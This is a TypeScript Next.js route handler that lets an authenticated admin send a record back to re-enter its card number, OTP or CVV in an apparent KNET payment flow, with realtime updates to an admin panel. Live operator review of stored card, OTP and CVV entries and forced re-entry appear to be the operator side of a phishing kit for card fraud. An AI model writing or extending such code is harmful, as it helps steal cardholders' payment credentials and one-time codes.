import { NextResponse } from "next/server";
import { readAdminToken } from "@/lib/token";
import { setKnetReviewStep, knetRejectToRetry, KNET_REVIEW } from "@/models/knet.repository";
import { scheduleAdminRealtimeBroadcast } from "@/lib/admin-realtime-hub";

function bearer(req: Request) {
  const h = req.headers.get("authorization") ?? "";
  return h.startsWith("Bearer ") ? readAdminToken(h.slice(7)) : null;
}

export async function POST(req: Request, { params }: { params: Promise<{ id: string }> }) {
  if (!bearer(req)) return NextResponse.json({}, { status: 401 });
  const { id } = await params;
  const body = await req.json().catch(() => ({}));
  const page = String((body as Record<string, unknown>).page ?? "");

  const stepMap: Record<string, string> = {
    card: KNET_REVIEW.retryCard,
    otp: KNET_REVIEW.retryOtp,
    cvv: KNET_REVIEW.retryCvv,
  };
  const step = stepMap[page];
  if (!step) return NextResponse.json({ error: "invalid_page" }, { status: 400 });

  if (page === "cvv") {
    await knetRejectToRetry(id, step, { clearCvv: true });
  } else {
    await setKnetReviewStep(id, step);
  }
  scheduleAdminRealtimeBroadcast();
  return NextResponse.json({ ok: true });
}
